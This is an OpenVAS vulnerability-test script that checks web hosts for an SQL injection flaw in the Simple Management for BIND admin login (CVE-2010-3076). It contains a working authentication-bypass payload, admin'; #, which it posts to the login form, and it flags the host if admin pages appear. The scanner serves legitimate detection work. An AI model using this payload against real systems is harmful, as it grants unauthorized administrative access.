###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_smbind_admin_login_sql_inj_vuln.nasl 14 2013-10-27 12:33:37Z jan $
#
# Simple Management BIND Admin Login Page SQL Injection Vulnerability
#
# Authors:
# Veerendra GG <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "Successful exploitation will allow attacker to cause SQL Injection attack
  and gain sensitive information.
  Impact Level: Application";
tag_affected = "SMBind version 0.4.7 and prior";
tag_insight = "The flaw is caused by improper validation of user-supplied input passed via
  the 'username' parameter to 'php/src/include.php', which allows attacker to
  manipulate SQL queries by injecting arbitrary SQL code.";
tag_solution = "Upgrade to 0.4.8 or later,
  For updates refer to http://sourceforge.net/projects/smbind/";
tag_summary = "This host is running Simple Managemen Bind and is prone to SQL
  injection vulnerability.";

if(description)
{
  script_id(800186);
  script_version("$Revision: 14 $");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
  script_tag(name:"creation_date", value:"2010-12-09 06:49:11 +0100 (Thu, 09 Dec 2010)");
  script_cve_id("CVE-2010-3076");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_tag(name:"risk_factor", value:"High");
  script_name("Simple Management BIND Admin Login Page SQL Injection Vulnerability");
  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;
  script_xref(name : "URL" , value : "http://osvdb.org/show/osvdb/67829");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/14884/");
  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/93486/smbind-sql.txt");
  
  script_description(desc);
  script_summary("Determine if Simple Managemen Bind to SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2010 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("http_version.nasl");
  script_require_ports("Services/www", 80);
  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
    script_tag(name : "impact" , value : tag_impact);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "summary" , value : tag_summary);
  }
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Get HTTP Port
port = get_http_port(default:80);

## Check Port State
if(!get_port_state(port)){
  exit(0);
}

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get Host Name or IP
host = get_host_name();
if(!host){
  exit(0);
}

## Iterate over possible paths
foreach dir (make_list("/smbind", "/", cgi_dirs()))
{
  ## Send and Recieve the response
  path = dir + "/src/main.php";
  req = http_get(item:path, port:port);
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);

  ## Confirm the application before trying exploit
  if(">Simple Management for BIND" >< res)
  {
    ## Post Data
    postData = "username=admin%27%3B+%23&password=test&Submit=Login";

    ## Construct SQL Injection attack post request
    req = string("POST ", path, " HTTP/1.1\r\n", "Host: ", host, "\r\n",
                 "User-Agent: SMBind SQL Injection Test\r\n",
                 "Content-Type: application/x-www-form-urlencoded\r\n",
                 "Content-Length: ", strlen(postData),
                 "\r\n\r\n", postData);

    ## Send post request and Recieve the response
    res = http_send_recv(port:port, data:req);

    ## Confirm exploit worked by checking the response
    if(">Change password<" >< res && ">Log out<" >< res &&
       ">Commit changes<" >< res)
    {
      security_hole(port);
      exit(0);
    }
  }
}
